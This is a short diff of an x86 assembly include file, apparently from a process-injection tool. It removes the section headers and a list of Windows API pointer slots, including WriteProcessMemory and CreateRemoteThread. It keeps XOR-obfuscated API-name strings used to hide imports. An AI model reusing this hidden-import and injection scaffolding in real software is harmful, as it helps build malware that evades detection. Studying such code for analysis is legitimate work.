@@ -1,5 +1,3 @@
-; include at the end of the .data section of the source file, and before the .bss section
-section .data
 STD_HANDLE_ENUM equ -11
 INVALID_HANDLE_VALUE equ -1
 TH32CS_SNAPPROCESS equ 0x2
@@ -93,29 +91,3 @@ resume_thread_xor: db 0x62, 0x55, 0x43, 0x45, 0x5d, 0x55, 0x64, 0x58, 0x42, 0x55
 
 output_debug_string_a_xor: db 0x7f, 0x45, 0x44, 0x40, 0x45, 0x44, 0x74, 0x55, 0x52, 0x45, 0x57, 0x63, 0x44, 0x42, 0x59, 0x5e, 0x57, 0x71, 0
 .len equ $ - output_debug_string_a_xor - 1
-
-section .bss
-kernel32: dd ?
-get_last_error: dd ?
-get_proc_addr: dd ?
-load_library_a: dd ?
-get_current_process: dd ?
-open_process: dd ?
-create_file_a: dd ?
-write_file: dd ?
-virtual_alloc: dd ?
-virtual_alloc_ex: dd ?
-virtual_protect_ex: dd ?
-virtual_protect: dd ?
-virtual_free_ex: dd ?
-read_process_memory: dd ?
-write_process_memory: dd ?
-create_remote_thread: dd ?
-wait_for_single_object: dd ?
-close_handle: dd ?
-create_toolhelp32_snapshot: dd ?
-process32_first: dd ?
-process32_next: dd ?
-sleep: dd ?
-resume_thread: dd ?
-output_debug_string_a: dd ?
